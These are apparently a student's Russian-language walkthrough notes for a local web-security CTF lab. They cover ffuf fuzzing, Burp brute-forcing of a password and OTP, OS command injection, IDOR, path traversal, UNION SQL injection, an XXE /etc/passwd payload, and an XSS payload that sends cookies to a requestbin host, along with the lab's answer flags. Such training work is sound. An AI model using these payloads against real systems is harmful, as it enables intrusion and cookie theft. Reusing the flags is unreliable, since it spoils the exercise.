**********************************************************************
## Уязвимость веб-приложений
**********************************************************************

***********************5.1. Введение в уровень ***********************
Скачали https://disk.yandex.ru/d/bXfeC1DM4vrUsw
из папки где находится docker-comppose 
sudo docker-compose up -d
Ждем старта сервиса
Сервис находится по адресу http://localhost:1337

## Работа с ffuf
  
# скачать fuzz.txt по адресу https://github.com/empty-jack/YAWR/tree/master 
# Web -> files_and_directories -> fuzz.txt
# https://github.com/empty-jack/YAWR/blob/master/Web/files_and_directories/fuzz.txt


└─$ ffuf -w ./fuzz.txt -u http://127.0.0.1:1337/FUZZ -fc 403  
# результат
 :: Method           : GET
 :: URL              : http://127.0.0.1:1337/FUZZ
 :: Wordlist         : FUZZ: /home/vit81/Documents/stepik/wh/fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

%2e                     [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 54ms]
                        [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 74ms]
admin                   [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 0ms]
admin/config.php        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
admin/index.php         [Status: 200, Size: 2730, Words: 647, Lines: 77, Duration: 0ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 0ms]
index.php               [Status: 200, Size: 32394, Words: 8943, Lines: 711, Duration: 0ms]
:: Progress: [4107/4107] :: Job [1/1] :: 40 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

Видим, что есть admin

# Обход аутентификации
Запускаем BurpSuite
Переходим в Proxy -> Intercept 
Ставим Intercept is off
Открываем Oen browser -> вводим адрес http://localhost:1337/admin
Введем несколько неправильных значений
Переходим в закладку HTTP histoty и выбираем наши неудачные попытки
ПКМ -> Send to Intruder
Переходим в закладку Intruder (рядом с Proxy)
ищим данный символ § (обычно он идет с логином, паролем и хешем, если его нет жмем Auto §)
В нашем случае три варианта, выделяем хэш и жмем кнопку Clear §. Логин и пароль должны быть с §
# Пример: username=§admin§&password=§123§
# Choose an attack type -> Cluster bomb (так как у нас два значения логин и пароль, то используем Cluster bomb с двумя параметрами. Cluster bomb сама определит количество параметров)
С закладки Positions переходим в закладку Payloads
Payload set = 1
Payload type = Simple list
Payload settings [Simplle list] в строке Add вводим admin (в нашем примере только admin, можно загрузить список из файла или вставить количество логинов)
 
Payload set = 2
Payload type = Simple list
Payload settings [Simplle list] жмем load (если есть файл, для загрузки) или paste если значения в буфере

Жмем атаку  Start attack
Анализзируем столбец Lenght - это длинна пакета в ответе, ее изменение означает, что мы подобрали правильный пароль
Login: admin
Password: q1w2e3r4

********************** 5.2 Уяззвимости обхода аутентификации (OTP key) ***************
# Обход аутентификации OTP
Запускаем BurpSuite
Переходим в Proxy -> Intercept 
Ставим Intercept is off
Открываем Oen browser -> вводим адрес http://localhost:1337/admin
Вводим Login: admin и Password: q1w2e3r4
# http://localhost:1337/admin/otp.php  
Введем несколько неправильных значений
Переходим в закладку HTTP histoty и выбираем наши неудачные попытки
ПКМ -> Send to Intruder
Переходим в закладку Intruder (рядом с Proxy)
ищим данный символ § (обычно он идет с логином, паролем и хешем, если его нет жмем Auto §)
В нашем случае OTP это один код (здесь упращено, мы заранее знаем о том что число трех значное)
Пример: OTP=§111§

Choose an attack type -> Sniper
С закладки Positions переходим в закладку Payloads
Payload set = 1
Payload type = Numbers
Payload settings [Numbers]
Type = Sequential
From 1
To 999 (так как у нас OTP три числа, количество попыток неограничено)
Step 1 (шаг 1)

Number format:
Min integer digits = 3
Max integer digits = 3

Жмем атаку  Start attack
Анализзируем столбец Lengh - отличие по длинне ответа

OTP = 807
# При хэше c72725442273587ced2f4e8db9ce5dfd
# Cookie: PHPSESSID=c72725442273587ced2f4e8db9ce5dfd
# Connection: keep-alive
# OTP=807
# 
# секретная строка в формате 32 букв и цифр) из кода страницы панели администратора.
# FLAG = 637302a3ed963d2772a9bf26c6c89a36
<!-- 637302a3ed963d2772a9bf26c6c89a36 --> (в браузере нажаьб F11, режим разработчика, закладка Elements)


******************* 5.3 Уязвимости инъекции клманд ОС ****************
Внедрим символ “;”, являющийся разделителем команд в Linux после названия процесса, и добавим в конец ещё одну команду, “ls”:
apache2; ls
    PID TTY          TIME CMD
      7 ?        00:00:01 apache2
     78 ?        00:00:00  \_ apache2
     79 ?        00:00:00  \_ apache2
     81 ?        00:00:00  \_ apache2
     83 ?        00:00:00  \_ apache2
     87 ?        00:00:00  \_ apache2
     89 ?        00:00:00  \_ apache2
     91 ?        00:00:00  \_ apache2
     93 ?        00:00:00  \_ apache2
     94 ?        00:00:00  \_ apache2
     95 ?        00:00:00  \_ apache2
.
..
config.php
footer.inc.php
header.inc.php
index.php
main.php
otp.php

Проведем базовую разведку, используя следующие команды:
    Показать текущую директорию: > pwd
    Показать текущего пользователя: > id
    Показать переменные окружения: > export

# Пример уязвимостей OS command injection
# https://www.youtube.com/watch?v=GDUadTiXXVk
# https://portswigger.net/web-security/os-command-injection/lab-simple    
    
# FLAG = c2098cad00958121da83a936845f41e7  


******************** 5.4 Уязвимости контроля доступа *********************
http://localhost:1337/
# сделать заказ
http://localhost:1337/receipt.php?orderID=2
# перейти на страницу http://localhost:1337/receipt.php?orderID=1 (меняем в конце 2 на 1)
http://localhost:1337/receipt.php?orderID=1
# FLAG = 4d08e6a8f673a9ba19cce9295585a5dc


******************** 5.5 Уязвимости разграничения доступа к каталогам ******
# FLAG = b181853c698ea9175d319561ae038433
#
Разбор техники

Ход действий

1. Загрузим основную страницу http://evil.corp:1337 и проанализируем запросы в BurpSuite, предварительно включив отображение картинок в фильтре:
5_5_1.png

2. Как видим, отображением картинок занимается скрипт image.php, а имя картинки передается через параметр file:
5_5_2.png

3. Отправим этот запрос в Repeater для дальнейшего анализа:
5_5_3.png

4. В этом режиме мы можем свободно редактировать запрос, вновь отправлять его серверу и получать результат. Для анализа изменим значение параметра file на некорректное, например, удалим последний символ из названия картинки:
5_5_4.png

5. Из сообщения об ошибке мы получим информацию о реальном пути до картинки на стороне сервера и расположении скрипта. Попробуем использовать абсолютный путь до файла, который точно должен быть на удаленной Linux-системе, например, /etc/hosts:
5_5_5.png

6. Эта попытка не сработала, потому что значение параметра file склеивается с путем до директории с картинками /var/www/html/static, что приводит к обращению к несуществующему файлу /var/www/html/static//etc/hosts. Мы можем попытаться выйти за пределы директории с картинками иным путем – используя относительные пути в Linux, где ./ обозначает текущую директорию, а ../ - директорию на уровень выше:
5_5_6.png
 

    Таким образом, с каждым ../ мы выходим на уровень выше из /var/www/html/static/, и путь /var/www/html/static/../../../../ становится эквивалентным пути к корневой директории /, что дает возможность обращаться к любым файлам в системе, например, к /etc/passwd.

# FLAG = b181853c698ea9175d319561ae038433


******************* 5.6 Уязвимости SQL-инъекции ********************************

http://localhost:1337/receipt.php?orderID=3
# 2+1
http://localhost:1337/receipt.php?orderID=2%2b1
# %2b  - плюс в url кодировке
# Поиск количества колонок в таблице
# http://localhost:1337/receipt.php?orderID=2 order by N , где N целое число которое мы перебираем. Как только система напишет ошибку, значит колонки нет.
# в нашем случаее N = 8 (8 колонок в таблице)
http://localhost:1337/receipt.php?orderID=2%20order%20by%208 

# UNION запросы
# у нас 8 колонок, перечисляем их все через запятую
http://localhost:1337/receipt.php?orderID=2 UNION SELECT 1,2,3,4,5,6,7,8 -- -
# -- - в конце оначает убрать все лишнее
# отсекаем запрос слева меняя orderID=2 на orderID=-1
http://localhost:1337/receipt.php?orderID=-1%20UNION%20SELECT%201,2,3,4,5,6,7,8%20--%20-
# Из этого запроса мы видим, какая колонка куда попадает (например колонка 5 это комментарий, а колонка 3 это e-mail и т.д.)
Теперь вместо 5 в запрос мы можем вставить любое выражение, например TABLE_NAME
http://localhost:1337/receipt.php?orderID=-1%20UNION%20SELECT%201,2,3,4,TABLE_NAME,6,7,8 FROM INFORMATION_SCHEMA.tables%20--%20-
# нам вернулась первая таблица orders
Теперь объеденим все виды ответов из свойств таблицы TABLE_NAME, то есть обеденим все ответы в одно поле с помощью команды: group_concat(TABLE_NAME,'-')
http://localhost:1337/receipt.php?orderID=-1%20UNION%20SELECT%201,2,3,4,group_concat(TABLE_NAME,'-'),6,7,8 FROM INFORMATION_SCHEMA.tables%20--%20-
# с помощью этого запроса в колонку 5 (Comments) мы выведем результат - все таблицы БД
Мы нашли нужную нам таблицу
Узнаем сколько у нее колонок, меняя TABLE на COLUMN и добавим условие WHERE только таблицу secret_table
group_concat(COLUMN_NAME,'-'),6,7,8 FROM INFORMATION_SCHEMA.columns WHERE table_name='super_secret_table'
# Сформируем запрос
http://localhost:1337/receipt.php?orderID=-1%20UNION%20SELECT%201,2,3,4,group_concat(COLUMN_NAME,'-'),6,7,8 FROM INFORMATION_SCHEMA.columns WHERE table_name='super_secret_table'%20--%20-

# Выведем содержание нужной нам колонки из таблицы super_secret_table
http://localhost:1337/receipt.php?orderID=-1%20UNION%20SELECT%201,2,3,4,super_secret_column,6,7,8 FROM super_secret_table%20--%20-
# Для этого исползуем вместо 5 имя нужной нам колонки из таблицы super_secret_table

FLAG = 2c16b1c6a40ffd585faf8caddad2bb40


****************** 5.7 Уязвимости внедрения внешних сущностей XML ******************
# Payload XXE Injection
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#classic-xxe

# Берем классическую, вывод файла /etc/passwd
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>

# Корректировка var/www/secret
<!DOCTYPE order [<!ENTITY file SYSTEM 
"file:////var/www/secret">]>

FLAG = 4a93a60b1c34fd11e4bac9920a14c00e

************************* 5.8 Атаки межсайтового скриптинга (XSS) ******************
# https://requestbin.com  сайт для генерации ссылок, Create a public bin instead.
# сгенерированная ссылка   https://public.requestbin.com/r/en0i7ibhqkgyqi
# https://en0i7ibhqkgyqi.x.pipedream.net  адрес нашего теста

# скрипт на вызов алерта JS
"><img src=x onerror=alert(2) />
# запрос fetch сторонниму серверу
fetch('https://en0i7ibhqkgyqi.x.pipedream.net/?'+document.cookie) />
# модификация нашего XXS запроса с отсылкой cockes админа
"><img src=x onerror=fetch('https://en0i7ibhqkgyqi.x.pipedream.net/?'+document.cookie) />

# FLAG
flag fed80ff7bad5a9274385b7b7bc370635

